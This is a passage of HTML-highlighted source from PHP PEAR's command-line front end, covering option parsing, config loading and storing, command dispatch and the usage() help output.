class="hljs-variable">$options</span>);<br>&#125;<br><br><span class="hljs-variable">$opts</span> = <span class="hljs-variable">$options</span>[<span class="hljs-number">0</span>];<br><br><span class="hljs-variable">$fetype</span> = <span class="hljs-string">&#x27;CLI&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$progname</span> == <span class="hljs-string">&#x27;gpear&#x27;</span> || <span class="hljs-variable">$progname</span> == <span class="hljs-string">&#x27;pear-gtk&#x27;</span>) &#123;<br>    <span class="hljs-variable">$fetype</span> = <span class="hljs-string">&#x27;Gtk2&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$opts</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$opt</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$opt</span>[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;G&#x27;</span>) &#123;<br>            <span class="hljs-variable">$fetype</span> = <span class="hljs-string">&#x27;Gtk2&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$pear_user_config</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$pear_system_config</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$store_user_config</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$store_system_config</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$verbose</span> = <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$opts</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$opt</span>) &#123;<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$opt</span>[<span class="hljs-number">0</span>]) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;c&#x27;</span>:<br>        <span class="hljs-variable">$pear_user_config</span> = <span class="hljs-variable">$opt</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;C&#x27;</span>:<br>        <span class="hljs-variable">$pear_system_config</span> = <span class="hljs-variable">$opt</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">setFrontendType</span>(<span class="hljs-variable">$fetype</span>);<br><span class="hljs-variable">$ui</span> = &amp;<span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">getFrontendObject</span>();<br><span class="hljs-variable">$config</span> = &amp;<span class="hljs-title class_">PEAR_Config</span>::<span class="hljs-title function_ invoke__">singleton</span>(<span class="hljs-variable">$pear_user_config</span>, <span class="hljs-variable">$pear_system_config</span>);<br><br><span class="hljs-keyword">if</span> (PEAR::<span class="hljs-title function_ invoke__">isError</span>(<span class="hljs-variable">$config</span>)) &#123;<br>    <span class="hljs-variable">$_file</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pear_user_config</span> !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-variable">$_file</span> .= <span class="hljs-variable">$pear_user_config</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pear_system_config</span> !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-variable">$_file</span> .= <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$pear_system_config</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_file</span> == <span class="hljs-string">&#x27;/&#x27;</span>) &#123;<br>        <span class="hljs-variable">$_file</span> = <span class="hljs-string">&#x27;The default config file&#x27;</span>;<br>    &#125;<br>    <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>    <span class="hljs-variable">$ui</span>-&gt;<span class="hljs-title function_ invoke__">outputData</span>(<span class="hljs-string">&quot;ERROR: <span class="hljs-subst">$_file</span> is not a valid config file or is corrupted.&quot;</span>);<br>    <span class="hljs-comment">// We stop, we have no idea where we are :)</span><br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">// this is used in the error handler to retrieve a relative path</span><br><span class="hljs-variable">$_PEAR_PHPDIR</span> = <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;php_dir&#x27;</span>);<br><span class="hljs-variable">$ui</span>-&gt;<span class="hljs-title function_ invoke__">setConfig</span>(<span class="hljs-variable">$config</span>);<br>PEAR::<span class="hljs-title function_ invoke__">setErrorHandling</span>(PEAR_ERROR_CALLBACK, <span class="hljs-keyword">array</span>(<span class="hljs-variable">$ui</span>, <span class="hljs-string">&quot;displayFatalError&quot;</span>));<br><br><span class="hljs-variable">$verbose</span> = <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&quot;verbose&quot;</span>);<br><span class="hljs-variable">$cmdopts</span> = <span class="hljs-keyword">array</span>();<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$raw</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">isDefinedLayer</span>(<span class="hljs-string">&#x27;user&#x27;</span>) &amp;&amp; !<span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">isDefinedLayer</span>(<span class="hljs-string">&#x27;system&#x27;</span>)) &#123;<br>        <span class="hljs-variable">$found</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$opts</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$opt</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$opt</span>[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;d&#x27;</span> || <span class="hljs-variable">$opt</span>[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;D&#x27;</span>) &#123;<br>                <span class="hljs-comment">// the user knows what they are doing, and are setting config values</span><br>                <span class="hljs-variable">$found</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$found</span>) &#123;<br>            <span class="hljs-comment">// no prior runs, try to install PEAR</span><br>            <span class="hljs-variable">$parent</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$parent</span>, <span class="hljs-string">&#x27;scripts&#x27;</span>)) &#123;<br>                <span class="hljs-variable">$grandparent</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$parent</span>);<br>                <span class="hljs-variable">$packagexml</span> = <span class="hljs-variable">$grandparent</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;package2.xml&#x27;</span>;<br>                <span class="hljs-variable">$pearbase</span> = <span class="hljs-variable">$grandparent</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$packagexml</span> = <span class="hljs-variable">$parent</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;package2.xml&#x27;</span>;<br>                <span class="hljs-variable">$pearbase</span> = <span class="hljs-variable">$parent</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$packagexml</span>)) &#123;<br>                <span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>] = <span class="hljs-keyword">array</span>(<br>                    <span class="hljs-string">&#x27;install&#x27;</span>,<br>                    <span class="hljs-variable">$packagexml</span><br>                );<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;php_dir&#x27;</span>, <span class="hljs-variable">$pearbase</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;php&#x27;</span>);<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;data_dir&#x27;</span>, <span class="hljs-variable">$pearbase</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;data&#x27;</span>);<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;doc_dir&#x27;</span>, <span class="hljs-variable">$pearbase</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;docs&#x27;</span>);<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;test_dir&#x27;</span>, <span class="hljs-variable">$pearbase</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;tests&#x27;</span>);<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<br>                    <span class="hljs-string">&#x27;ext_dir&#x27;</span>,<br>                    <span class="hljs-variable">$pearbase</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;extensions&#x27;</span><br>                );<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;bin_dir&#x27;</span>, <span class="hljs-variable">$pearbase</span>);<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">mergeConfigFile</span>(<span class="hljs-variable">$pearbase</span> . <span class="hljs-string">&#x27;pear.ini&#x27;</span>, <span class="hljs-literal">false</span>);<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">store</span>();<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;auto_discover&#x27;</span>, <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$opts</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$opt</span>) &#123;<br>    <span class="hljs-variable">$param</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$opt</span>[<span class="hljs-number">1</span>]) ? <span class="hljs-variable">$opt</span>[<span class="hljs-number">1</span>] : <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$opt</span>[<span class="hljs-number">0</span>]) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;d&#x27;</span>:<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$param</span> === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<br>                <span class="hljs-string">&#x27;Invalid usage of &quot;-d&quot; option, expected -d config_value=value, &#x27;</span> .<br>                <span class="hljs-string">&#x27;received &quot;-d&quot;&#x27;</span> . <span class="hljs-string">&quot;\n&quot;</span><br>            );<br>        &#125;<br>        <span class="hljs-variable">$possible</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-variable">$param</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$possible</span>) != <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<br>                <span class="hljs-string">&#x27;Invalid usage of &quot;-d&quot; option, expected &#x27;</span> .<br>                <span class="hljs-string">&#x27;-d config_value=value, received &quot;&#x27;</span> . <span class="hljs-variable">$param</span> . <span class="hljs-string">&#x27;&quot;&#x27;</span> . <span class="hljs-string">&quot;\n&quot;</span><br>            );<br>        &#125;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>) = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-variable">$param</span>);<br>        <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-string">&#x27;user&#x27;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;D&#x27;</span>:<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$param</span> === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<br>                <span class="hljs-string">&#x27;Invalid usage of &quot;-d&quot; option, expected &#x27;</span> .<br>                <span class="hljs-string">&#x27;-d config_value=value, received &quot;-d&quot;&#x27;</span> . <span class="hljs-string">&quot;\n&quot;</span><br>            );<br>        &#125;<br>        <span class="hljs-variable">$possible</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-variable">$param</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$possible</span>) != <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<br>                <span class="hljs-string">&#x27;Invalid usage of &quot;-d&quot; option, expected &#x27;</span> .<br>                <span class="hljs-string">&#x27;-d config_value=value, received &quot;&#x27;</span> . <span class="hljs-variable">$param</span> . <span class="hljs-string">&#x27;&quot;&#x27;</span> . <span class="hljs-string">&quot;\n&quot;</span><br>            );<br>        &#125;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>) = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-variable">$param</span>);<br>        <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-string">&#x27;system&#x27;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>        <span class="hljs-variable">$store_user_config</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;S&#x27;</span>:<br>        <span class="hljs-variable">$store_system_config</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;u&#x27;</span>:<br>        <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">remove</span>(<span class="hljs-variable">$param</span>, <span class="hljs-string">&#x27;user&#x27;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;v&#x27;</span>:<br>        <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;verbose&#x27;</span>, <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;verbose&#x27;</span>) + <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;q&#x27;</span>:<br>        <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;verbose&#x27;</span>, <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;verbose&#x27;</span>) - <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;V&#x27;</span>:<br>        <span class="hljs-title function_ invoke__">usage</span>(<span class="hljs-literal">null</span>, <span class="hljs-string">&#x27;version&#x27;</span>);<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;c&#x27;</span>:<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;C&#x27;</span>:<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-comment">// all non pear params goes to the command</span><br>        <span class="hljs-variable">$cmdopts</span>[<span class="hljs-variable">$opt</span>[<span class="hljs-number">0</span>]] = <span class="hljs-variable">$param</span>;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$store_system_config</span>) &#123;<br>    <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">store</span>(<span class="hljs-string">&#x27;system&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$store_user_config</span>) &#123;<br>    <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">store</span>(<span class="hljs-string">&#x27;user&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$command</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>])) ? <span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] : <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$command</span>) &amp;&amp; (<span class="hljs-variable">$store_user_config</span> || <span class="hljs-variable">$store_system_config</span>)) &#123;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$fetype</span> == <span class="hljs-string">&#x27;Gtk2&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">validConfiguration</span>()) &#123;<br>        PEAR::<span class="hljs-title function_ invoke__">raiseError</span>(<br>            <span class="hljs-string">&quot;CRITICAL ERROR: no existing valid configuration files found in &quot;</span> .<br>            <span class="hljs-string">&quot;files &#x27;<span class="hljs-subst">$pear_user_config</span>&#x27; or &#x27;<span class="hljs-subst">$pear_system_config</span>&#x27;, &quot;</span> .<br>            <span class="hljs-string">&quot;please copy an existing configuration file to one of these &quot;</span> .<br>            <span class="hljs-string">&quot;locations, or use the -c and -s options to create one&quot;</span><br>        );<br>    &#125;<br>    <span class="hljs-title class_">Gtk</span>::<span class="hljs-title function_ invoke__">main</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$command</span> == <span class="hljs-string">&#x27;help&#x27;</span>) &#123;<br>            <span class="hljs-title function_ invoke__">usage</span>(<span class="hljs-literal">null</span>, <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]) ? <span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] : <span class="hljs-literal">null</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">validConfiguration</span>()) &#123;<br>            PEAR::<span class="hljs-title function_ invoke__">raiseError</span>(<br>                <span class="hljs-string">&quot;CRITICAL ERROR: no existing valid configuration files found &quot;</span> .<br>                <span class="hljs-string">&quot;in files &#x27;<span class="hljs-subst">$pear_user_config</span>&#x27; or &#x27;<span class="hljs-subst">$pear_system_config</span>&#x27;, &quot;</span> .<br>                <span class="hljs-string">&quot;please copy an existing configuration file to one of &quot;</span> .<br>                <span class="hljs-string">&quot;these locations, or use the -c and -s options to create one&quot;</span><br>            );<br>        &#125;<br><br>        PEAR::<span class="hljs-title function_ invoke__">pushErrorHandling</span>(PEAR_ERROR_RETURN);<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">factory</span>(<span class="hljs-variable">$command</span>, <span class="hljs-variable">$config</span>);<br>        PEAR::<span class="hljs-title function_ invoke__">popErrorHandling</span>();<br>        <span class="hljs-keyword">if</span> (PEAR::<span class="hljs-title function_ invoke__">isError</span>(<span class="hljs-variable">$cmd</span>)) &#123;<br>            <span class="hljs-title function_ invoke__">usage</span>(<span class="hljs-literal">null</span>, <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]) ? <span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] : <span class="hljs-literal">null</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$short_args</span> = <span class="hljs-variable">$long_args</span> = <span class="hljs-literal">null</span>;<br>        <span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">getGetoptArgs</span>(<span class="hljs-variable">$command</span>, <span class="hljs-variable">$short_args</span>, <span class="hljs-variable">$long_args</span>);<br>        <span class="hljs-title function_ invoke__">array_shift</span>(<span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$tmp</span> = <span class="hljs-title class_">Console_Getopt</span>::<span class="hljs-title function_ invoke__">getopt2</span>(<span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$short_args</span>, <span class="hljs-variable">$long_args</span>);<br><br>        <span class="hljs-keyword">if</span> (PEAR::<span class="hljs-title function_ invoke__">isError</span>(<span class="hljs-variable">$tmp</span>)) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$tmpopt</span>, <span class="hljs-variable">$params</span>) = <span class="hljs-variable">$tmp</span>;<br>        <span class="hljs-variable">$opts</span> = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$tmpopt</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$foo</span> =&gt; <span class="hljs-variable">$tmp2</span>) &#123;<br>            <span class="hljs-keyword">list</span>(<span class="hljs-variable">$opt</span>, <span class="hljs-variable">$value</span>) = <span class="hljs-variable">$tmp2</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$value</span> === <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-variable">$value</span> = <span class="hljs-literal">true</span>; <span class="hljs-comment">// options without args</span><br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$opt</span>) == <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-variable">$cmdoptions</span> = <span class="hljs-variable">$cmd</span>-&gt;<span class="hljs-title function_ invoke__">getOptions</span>(<span class="hljs-variable">$command</span>);<br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$cmdoptions</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$o</span> =&gt; <span class="hljs-variable">$d</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$d</span>[<span class="hljs-string">&#x27;shortopt&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$d</span>[<span class="hljs-string">&#x27;shortopt&#x27;</span>] == <span class="hljs-variable">$opt</span>) &#123;<br>                        <span class="hljs-variable">$opts</span>[<span class="hljs-variable">$o</span>] = <span class="hljs-variable">$value</span>;<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$opt</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>) == <span class="hljs-string">&#x27;--&#x27;</span>) &#123;<br>                    <span class="hljs-variable">$opts</span>[<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$opt</span>, <span class="hljs-number">2</span>)] = <span class="hljs-variable">$value</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-variable">$ok</span> = <span class="hljs-variable">$cmd</span>-&gt;<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$command</span>, <span class="hljs-variable">$opts</span>, <span class="hljs-variable">$params</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ok</span> === <span class="hljs-literal">false</span>) &#123;<br>            PEAR::<span class="hljs-title function_ invoke__">raiseError</span>(<span class="hljs-string">&quot;unknown command `<span class="hljs-subst">$command</span>&#x27;&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (PEAR::<span class="hljs-title function_ invoke__">isError</span>(<span class="hljs-variable">$ok</span>)) &#123;<br>            PEAR::<span class="hljs-title function_ invoke__">setErrorHandling</span>(<br>                PEAR_ERROR_CALLBACK, <span class="hljs-keyword">array</span>(<span class="hljs-variable">$ui</span>, <span class="hljs-string">&quot;displayFatalError&quot;</span>)<br>            );<br>            PEAR::<span class="hljs-title function_ invoke__">raiseError</span>(<span class="hljs-variable">$ok</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (<span class="hljs-literal">false</span>);<br>&#125;<br><br><span class="hljs-comment">// &#123;&#123;&#123; usage()</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Display usage information</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> mixed $error       Optional error message</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> mixed $helpsubject Optional subject/command to display help for</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> void</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">usage</span>(<span class="hljs-params"><span class="hljs-variable">$error</span> = <span class="hljs-literal">null</span>, <span class="hljs-variable">$helpsubject</span> = <span class="hljs-literal">null</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$progname</span>, <span class="hljs-variable">$all_commands</span>;<br>    <span class="hljs-variable">$stdout</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;php://stdout&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (PEAR::<span class="hljs-title function_ invoke__">isError</span>(<span class="hljs-variable">$error</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-variable">$stdout</span>, <span class="hljs-variable">$error</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>() . <span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$error</span> !== <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-variable">$stdout</span>, <span class="hljs-string">&quot;<span class="hljs-subst">$error</span>\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$helpsubject</span> != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-variable">$put</span> = <span class="hljs-title function_ invoke__">cmdHelp</span>(<span class="hljs-variable">$helpsubject</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$put</span> = <span class="hljs-string">&quot;Commands:\n&quot;</span>;<br>        <span class="hljs-variable">$maxlen</span> = <span class="hljs-title function_ invoke__">max</span>(<span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&quot;strlen&quot;</span>, <span class="hljs-variable">$all_commands</span>));<br>        <span class="hljs-variable">$formatstr</span> = <span class="hljs-string">&quot;%-<span class="hljs-subst">&#123;$maxlen&#125;</span>s  %s\n&quot;</span>;<br>        <span class="hljs-title function_ invoke__">ksort</span>(<span class="hljs-variable">$all_commands</span>);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$all_commands</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$cmd</span> =&gt; <span class="hljs-variable">$class</span>) &#123;<br>            <span class="hljs-variable">$put</span> .= <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-variable">$formatstr</span>, <span class="hljs-variable">$cmd</span>, <span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">getDescription</span>(<span class="hljs-variable">$cmd</span>));<br>        &#125;<br>        <span class="hljs-variable">$put</span> .=<br>            <span class="hljs-string">&quot;Usage: <span class="hljs-subst">$progname</span> [options] command [command-options] &lt;parameters&gt;\n&quot;</span>.<br>            <span class="hljs-string">&quot;Type \&quot;<span class="hljs-subst">$progname</span> help options\&quot; to list all options.\n&quot;</span>.<br>            <span class="hljs-string">&quot;Type \&quot;<span class="hljs-subst">$progname</span> help shortcuts\&quot; to list all command shortcuts.\n&quot;</span>.<br>            <span class="hljs-string">&quot;Type \&quot;<span class="hljs-subst">$progname</span> help version\&quot; or &quot;</span>.<br>            <span class="hljs-string">&quot;\&quot;<span class="hljs-subst">$progname</span> version\&quot; to list version information.\n&quot;</span>.<br>            <span class="hljs-string">&quot;Type \&quot;<span class="hljs-subst">$progname</span> help &lt;command&gt;\&quot; to get the help &quot;</span>.<br>            <span class="hljs-string">&quot;for the specified command.&quot;</span>;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-variable">$stdout</span>, <span class="hljs-string">&quot;<span class="hljs-subst">$put</span>\n&quot;</span>);<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$stdout</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$error</span> === <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span 